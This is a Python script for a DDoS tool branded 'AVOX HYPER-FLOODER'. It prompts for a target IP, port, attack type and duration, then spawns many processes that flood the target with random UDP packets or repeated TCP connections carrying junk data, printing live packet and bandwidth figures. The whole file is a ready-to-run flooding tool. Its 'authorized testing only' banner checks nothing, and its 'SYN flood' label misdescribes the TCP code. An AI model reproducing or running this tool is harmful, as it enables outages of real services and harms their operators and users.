"""
AVOX HYPER-FLOODER - 10Gbps+ DDoS Tool  
WARNING: Only for authorized stress testing. Illegal use prohibited.  
"""

import socket  
import random  
import threading  
import time  
import sys  
import os  
import signal  
import ctypes  
import multiprocessing  
from os import system, name  

# ===== CONFIGURATION ===== #  
PACKET_SIZE = 1472          # Max UDP payload (1500 MTU - 28 header)  
THREADS_PER_CORE = 100      # Threads per CPU core  
BATCH_SIZE = 500            # Packets per send operation  
PRIORITY = True             # Boost process priority (Windows/Unix)  

# ===== CORE FUNCTIONS ===== #  
class HyperFlooder:  
    def __init__(self, target_ip, target_port, attack_type, duration):  
        self.target_ip = target_ip  
        self.target_port = target_port  
        self.attack_type = attack_type.lower()  
        self.duration = duration  
        self.counter = multiprocessing.Value('L', 0)  
        self.running = True  
        self.processes = []  

        # Boost process priority  
        if PRIORITY:  
            self.set_high_priority()  

    def set_high_priority(self):  
        """Boost process priority for maximum performance"""  
        try:  
            if os.name == 'nt':  # Windows  
                ctypes.windll.kernel32.SetPriorityClass(ctypes.windll.kernel32.GetCurrentProcess(), 0x00000080)  # HIGH_PRIORITY  
            else:  # Unix  
                os.nice(-20)  
        except:  
            pass  

    def generate_payload(self):  
        """Optimized payload generator"""  
        return random._urandom(PACKET_SIZE)  

    def udp_attack(self):  
        """10Gbps+ UDP Flood"""  
        payload = self.generate_payload()  
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**30)  

        while self.running:  
            try:  
                for _ in range(BATCH_SIZE):  
                    sock.sendto(payload, (self.target_ip, self.target_port))  
                    with self.counter.get_lock():  
                        self.counter.value += 1  
            except:  
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**30)  

    def tcp_attack(self):  
        """High-Power TCP SYN Flood"""  
        payload = self.generate_payload()  
        while self.running:  
            try:  
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)  
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**30)  
                sock.connect((self.target_ip, self.target_port))  
                for _ in range(BATCH_SIZE):  
                    sock.send(payload)  
                    with self.counter.get_lock():  
                        self.counter.value += 1  
                sock.close()  
            except:  
                pass  

    def start(self):  
        """Launch multi-process attack"""  
        num_cores = multiprocessing.cpu_count()  
        total_processes = num_cores * 2  # Hyper-threading boost  

        attack_func = self.udp_attack if self.attack_type == "udp" else self.tcp_attack  

        for _ in range(total_processes):  
            p = multiprocessing.Process(target=attack_func)  
            p.daemon = True  
            p.start()  
            self.processes.append(p)  

        self.monitor()  

    def stop(self):  
        """Stop all attack processes"""  
        self.running = False  
        for p in self.processes:  
            p.terminate()  

    def monitor(self):  
        """Real-time 10Gbps monitoring"""  
        start_time = time.time()  
        last_count = 0  

        while time.time() - start_time < self.duration and self.running:  
            time.sleep(1)  
            current_count = self.counter.value  
            elapsed = time.time() - start_time  

            pps = (current_count - last_count)  
            gbps = (pps * PACKET_SIZE * 8) / (1024**3)  

            sys.stdout.write(f"\r[+] Time: {int(elapsed)}s | Packets: {current_count:,} | Rate: {pps:,} pps | Power: {gbps:.2f} Gbps")  
            sys.stdout.flush()  
            last_count = current_count  

        self.stop()  
        print("\n[+] Attack finished at maximum power")  

# ===== MAIN EXECUTION ===== #  
def clear_screen():  
    os.system('cls' if name == 'nt' else 'clear')  

def signal_handler(sig, frame):  
    print("\n[!] Terminating attack...")  
    if 'flooder' in globals():  
        flooder.stop()  
    sys.exit(0)  

if __name__ == "__main__":  
    signal.signal(signal.SIGINT, signal_handler)  
    clear_screen()  

    print("\033[1;31;40m")  
    os.system("figlet AVOX HYPER-FLOODER -f slant")  
    print("\033[1;33;40mWARNING: 10Gbps+ capability. For authorized testing ONLY!\n")  
    print("\033[1;32;40m==> Copyright © AVOX - Ultimate Power Edition <==\n")  

    try:  
        target_ip = input("Target IP: ")  
        target_port = int(input("Target Port: "))  
        attack_type = input("Attack Type (UDP/TCP): ").strip().lower()  
        duration = int(input("Duration (seconds, max 1800): "))  

        if attack_type not in ["udp", "tcp"]:  
            raise ValueError("Invalid attack type")  
        if duration > 1800:  
            raise ValueError("Max duration is 1800 seconds")  

        flooder = HyperFlooder(target_ip, target_port, attack_type, duration)  
        flooder.start()  

    except Exception as e:  
        print(f"[!] Error: {e}")  
        sys.exit(1)  
